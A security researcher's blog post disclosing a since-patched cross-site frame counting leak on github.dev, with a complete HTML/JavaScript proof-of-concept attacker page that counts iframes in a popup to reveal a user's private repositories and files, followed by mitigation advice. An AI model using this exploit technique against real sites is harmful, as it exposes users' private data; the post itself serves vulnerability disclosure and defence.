---
layout: post
title:  "How Cross-Site Frame Counting Exposes Private Repositories on GitHub"
title_tag: How Cross-Site Frame Counting Exposes Private Repositories on GitHub - Medi
image: https://mr-medi.github.io/assets/img/csfc.png
categories: Research
date:   2023-07-31 09:36:24 +0200
description: "Unveiling the Hidden Risks: How Cross-Site Frame Counting Exposes Private Repositories on GitHub"
---



<h1 style="background-image: url('/assets/img/sectionl.jpeg'); background-repeat: no-repeat; background-position: center center; background-size: cover;" class="title-report responsive-font">frames.length</h1>

<h2 class="introfont" style="font-size: 2em!important;">Introduction</h2>

`Cross-Site Frame Counting` alludes to the technique of determining the total number of windows references (iframes) from external websites. While it is not a vulnerability in itself, as I will demonstrate in the following example, it can potentially lead to the exposure of private information if the number of iframes loaded on the target website varies depending on certain conditions.


I would like to express my sincere appreciation to the [GitHub][github] team for their feedback during the creation of this article. Although I am unable to disclose this report in Hackerone due to it being an internal duplicate, GitHub willingly reviewed a preview of my blog and provided feedback.

In the next section, I will illustrate how this technique, known as **cross-site frame counting**, could have potentially exposed your private GitHub repositories.

<h2 class="introfont" style="font-size: 2em!important;">Methodology</h2>

To identify this kind of attacks, we'll apply the following **methodology**:

![Methodology image](/assets/img/methodoly-csfc.png)

<h2 class="introfont" style="font-size: 2em!important;">Context</h2>


GitHub utilizes custom [VS-Codespaces][codespaces] to enhance the code editing experience for repositories. The URL pattern to access and edit these files back in the day follows this pattern:

 `https://github.dev/{USER}/{REPOSITORY}/blob/master/{FILENAME}`

 During my testing, I discovered an interesting behavior related to the number of iframes loaded, which led to the following observations:

- When **2 iframes** are loaded, it indicates that the file does not exists, but the private repository does. It happens due to the **Get Started** section was being embebed within an iframe.
<img src="/assets/img/case2.png" alt="Case 2" style="display: block; max-width:80%;height:auto;"/>

- If only **1 iframe** is loaded, then the file exists in the repository.
<img src="/assets/img/case1.png" alt="Case 1" style="display: block; max-width:80%;height:auto;"/>
- When **0 iframes** are loaded, then the repository does not exists.


<h2 class="introfont" style="font-size: 2em!important;">Exploit</h2>


With that conditions in mind, I coded a PoC as an example of a potential attacker website to show how to expose private repositories and files in a private github repository:

{% highlight html %}
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>GitHub PoC</title>
    <style>
      *
      {
        background-color: black;
        color: white;
        font-size: 35px;
      }

      span
      {
        font-weight: bold;
        color: green;
      }

      .repos
      {
        border: 1px solid red;
        font-weight: bold;
      }
      button{
          background: #ff4500;
          color: white;
          border: none;
          border-radius: 20px;
          height: 30px;
          padding: 8px;
          font-weight: bold;
          display: block;
          position: relative;
          width: 520px;
          font-size: 15px;
      }
    </style>
  </head>
  <body>
    <div>
      <button onclick="attack();">Start Attack</button>
      <p>
        Dear user, <span id="user"></span>. Here are your private repositories:
      </p>
      <div id="repos" class="repos"></div>
    </div>

    <script type="text/javascript">
      var win;
      // Change this variable to the user you want to leak the private repositories
      var user = 'mr-medi';
      var repositoriesToCheck = ['mi-web', 'not-found'];
      var files = ['metallica.ttf', 'index.html', 'test.txt', 'robots.txt'];

    /*
      Function to check if a file in a private repository exist by counting the iframes.
      If 2 iframes are loaded means the file does not exists.
      If 1 iframe, then the file exists in the repository.
      If 0 iframes, then the repository does not exists.
    */
    async function existsFile(url)
    {
      win.location = url;
      // Wait for the page to load
      await setTimeout(() =>
      {
        // Read the number of iframes loaded
        var iframesCount = win.length;
        var message = "";

        if (iframesCount == 0)
        {
          message = "[ - ] " + iframesCount + " iframes - Repository doesn't exists in -> " + url;
        }
        else
        {
          var message = iframesCount >= 2 ? "[ - ] " + iframesCount + " iframes - NOT FOUND -> " + url : "[ + ] "+ iframesCount +" iframes - FOUND! -> " + url;

          if (iframesCount == 1)
          {
            let urlRepo = url.replace("https://github.dev", "https://github.com")
            let divRepos = document.getElementById("repos");
            let pElement = document.createElement("p");
            pElement.textContent = urlRepo;
            divRepos.appendChild(pElement);
          }
        }
        console.log(message);
      }, 9000);
    }

    /*
    MAIN FUNCTION
    */
    async function attack()
    {
      win = window.open("",'','width=1,height=1,resizable=no');
      let spanUser = document.getElementById("user");
      spanUser.textContent = user;

      // FOREACH REPOSITORY
      for (let i in repositoriesToCheck)
      {
        let repo = repositoriesToCheck[i].replaceAll("-", "");

        // WE ITERATE THROUGH EACH FILE
        for (let j in files)
        {
          let file = files[j];
          let url = "https://github.dev/" + user + "/" + repo + "/blob/master/" + file;
          await existsFile(url);
          await new Promise(r => setTimeout(r, 9000));
        }
      }
      win.close();
    };
    </script>
  </body>
</html>
{% endhighlight %}




This was reported at the end of last year and patched now. Here's a video of the attack in action:

<div class="embed-responsive embed-responsive-16by9">
<iframe width="560" height="315" src="https://www.youtube.com/embed/uc0EHy_MnqM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</div>



<h2 class="introfont" style="font-size: 2em!important;">Final Thoughts</h2>

While Cross-Site Frame Counting may not be a new technique, in fact, is a quite old vulnerability, and the lack of disclosed reports about this behavior makes it an interesting topic to bring attention to in a major program like GitHub.

I'm not sure who was the first researcher in talking about this issue, so, for references, I will cite the XSLeaks Wiki.

<h2 class="introfont" style="font-size: 2em!important;">Securing applications</h2>

To mitigate the risk of data exposure through Cross-Site Frame Counting, it is crucial to load the same number of iframes consistently, regardless of any state. By ensuring a uniform iframe loading behavior, the application can prevent potential information leakage that could occur due to variations in the number of iframes.


<h2 class="introfont" style="font-size: 2em!important;">References</h2>


[Cross-Site Frame Counting Explained in XS-Leaks Wiki][r1]

[Expose who you have been messaging with via Cross-Site Frame Counting on Facebook][report]

[report]:https://www.imperva.com/blog/mapping-communication-between-facebook-accounts-using-a-browser-based-side-channel-attack/
[r1]:https://xsleaks.dev
[codespaces]:https://github.com/features/codespaces
[github]:https://hackerone.com/github


{% include see-more.html %}